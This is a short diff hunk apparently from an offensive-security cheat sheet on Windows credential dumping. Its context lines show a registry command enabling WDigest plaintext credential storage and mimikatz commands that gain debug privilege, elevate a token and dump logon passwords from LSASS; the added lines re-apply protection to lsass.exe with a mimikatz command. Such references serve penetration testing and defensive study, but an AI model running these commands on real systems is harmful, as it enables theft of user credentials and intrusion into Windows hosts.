@@ -77,6 +77,9 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   mimikatz # privilege::debug    
   mimikatz # token::elevate
   mimikatz # sekurlsa::logonpasswords
+  
+  # Now lets re-add the protection flags to the lsass.exe process
+  mimikatz # !processprotect /process:lsass.exe
   ```
 
 - LSA is running as virtualized process (LSAISO) by **Credential Guard**
